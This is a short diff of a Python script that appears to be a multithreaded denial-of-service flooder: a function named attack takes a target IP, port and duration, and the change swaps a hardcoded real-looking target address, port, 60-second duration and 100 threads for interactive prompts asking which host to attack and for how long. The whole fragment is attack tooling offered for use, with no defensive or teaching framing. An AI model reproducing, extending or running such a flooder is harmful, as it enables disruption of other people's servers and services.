@@ -17,10 +17,10 @@ def attack(ip, port, duration):
         time.sleep(0.001)
 
 def main():
-    ip = "20.219.163.225"  # Replace with target IP
-    port = 15190  # Replace with target port
-    duration = 60  # Replace with attack duration in seconds
-    num_threads = 100  # Replace with number of threads
+    ip = input("Enter the target IP: ")
+    port = int(input("Enter the target port: "))
+    duration = int(input("Enter the attack duration in seconds: "))
+    num_threads = int(input("Enter the number of threads: "))
 
     threads = []
     for _ in range(num_threads):
